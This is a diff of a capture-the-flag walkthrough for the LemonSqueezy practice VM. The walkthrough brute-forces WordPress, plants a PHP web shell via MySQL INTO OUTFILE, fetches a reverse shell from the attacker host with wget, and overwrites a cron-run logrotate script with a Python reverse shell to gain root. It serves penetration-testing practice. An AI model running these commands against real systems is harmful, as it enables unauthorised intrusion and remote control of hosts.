@@ -1,9 +1,18 @@
-is is a beginner boot2root in a similar style to ones I personally enjoy like Mr Robot, Lazysysadmin and MERCY.
+
+# Description
+
+This is a beginner boot2root in a similar style to ones I personally enjoy like Mr Robot, Lazysysadmin and MERCY.
 
 This is a VMware machine. DHCP is enabled, add lemonsqueezy to your hosts. It’s easypeasy!
 
+# Keywords
 
-└─$ sudo nmap -sT -A -Pn -n -p- 172.16.227.130
+worpress, mysql select into outfile, crontab
+
+# nmap
+
+```console
+$ sudo nmap -sT -A -Pn -n -p- 172.16.227.130
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 07:04 CEST
 Nmap scan report for 172.16.227.130
@@ -27,9 +36,13 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds
 
+```
 
+# scan web service
 
-└─$ dirb http://172.16.227.130                                                       130 ⨯
+```console
+
+$ dirb http://172.16.227.130
 
 -----------------
 DIRB v2.22    
@@ -51,39 +64,50 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://172.16.227.130/phpmyadmin/                                          
 + http://172.16.227.130/server-status (CODE:403|SIZE:279)                                 
 ==> DIRECTORY: http://172.16.227.130/wordpress/ 
+...
+```
+## wpscan
 
+```console
 
-[+] Performing password attack on Xmlrpc against 2 user/s
-
+$ wpscan  --url http://lemonsqueezy/wordpress/  -P /usr/share/wordlists/rockyou.txt  
+...
 [!] Valid Combinations Found:
  | Username: orange, Password: ginger
+...
+```
+    
+    Found password at http://lemonsqueezy/wordpress/wp-admin/post.php?post=5&action=edit
 
-└─$ wpscan  --url http://lemonsqueezy/wordpress/  -P /usr/share/wordlists/rockyou.txt  
-
-http://lemonsqueezy/wordpress/wp-admin/post.php?post=5&action=edit
-
-n0t1n@w0rdl1st!
-
-
-orange@squeezy.org.au
+    n0t1n@w0rdl1st!
 
 
-SELECT "<?php phpinfo(); ?>"  into outfile "/tmp/info.php"
+## inject code
+
+
+```console
+
 SELECT "<?php phpinfo(); ?>"  into outfile "/var/www/html/info.php"
 SELECT "<?php phpinfo(); ?>"  into outfile "/var/www/html/wordpress/info.php"
 SELECT "<?php system($_GET['cmd']); ?>"  into outfile "/var/www/html/wordpress/shell.php"
+```
 
+# Get shell
 
+```console
+curl http://172.16.227.130/wordpress/shell.php?cmd=id
 
+```
 
+## exploit code
 
-http://172.16.227.130/wordpress/shell.php?cmd=id
+```bash
 
+# $ cat exploit.sh
 
-└─$ cat exploit.sh
 #!/bin/bash
 
-HOST=172.16.227.130
+HOST=lemonsqueezy
 SHELL=wordpress/shell.php
 
 printf "$ "
@@ -97,8 +121,11 @@ do
     
     printf "$ "
 done < "/proc/${$}/fd/0"
+```
 
+## upload php shell
 
+```console
 $ cat /var/www/user.txt
 TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH
 
@@ -114,14 +141,18 @@ Music can change your life, base64: invalid input
 
 touch > /var/www/html/wordpress/test
 
-wget http://172.16.227.1:8888/php-reverse-shell.php -O /var/www/html/wordpress/php-reverse-shell.phpinfo
+wget http://172.16.227.1:8888/php-reverse-shell.php -O /var/www/html/wordpress/php-reverse-shell.php
+```
+
+## get PHP shell
+
+```console
+$ curl http://172.16.227.130/wordpress/php-reverse-shell.php
+```
 
 
-└─$ curl http://172.16.227.130/wordpress/php-reverse-shell.php
-
-
-
-└─$ nc -nlvp 1234                         
+```console
+$ nc -nlvp 1234                         
 listening on [any] 1234 ...
 connect to [172.16.227.1] from (UNKNOWN) [172.16.227.130] 41932
 Linux lemonsqueezy 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 GNU/Linux
@@ -131,9 +162,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
+## Dig server
 
-
+```console
 
 $ cat crontab
 # /etc/crontab: system-wide crontab
@@ -156,7 +189,24 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 $ ls -al /etc/logrotate.d/logrotate
 -rwxrwxrwx 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate
 
+```
 
+## /etc/logrotate.d/logrotate file
+
+```python
+
+#!/usr/bin/env python
+import os
+import sys
+try:
+   os.system('rm -r /tmp/* ')
+except:
+    sys.exit()
+```
+
+# Get root
+
+```console
 
 echo '#!/usr/bin/env python' >/etc/logrotate.d/logrotate
 echo 'import socket,subprocess,os' >>/etc/logrotate.d/logrotate
@@ -168,9 +218,9 @@ echo 'os.dup2(s.fileno(),0)' >>/etc/logrotate.d/logrotate
 echo 'os.dup2(s.fileno(),1)' >>/etc/logrotate.d/logrotate
 echo 'os.dup2(s.fileno(),2)' >>/etc/logrotate.d/logrotate
 echo 'p=subprocess.call("/bin/bash")' >>/etc/logrotate.d/logrotate
-
-
-└─$ nc -nlvp 4444                                                                      1 ⨯
+```
+```console
+$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [172.16.227.1] from (UNKNOWN) [172.16.227.130] 39720
 id
@@ -193,3 +243,4 @@ drwxr-xr-x  2 root root 4096 Apr 26  2020 .nano
 root@lemonsqueezy:~# cat /root/root.txt
 cat /root/root.txt
 NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
+```
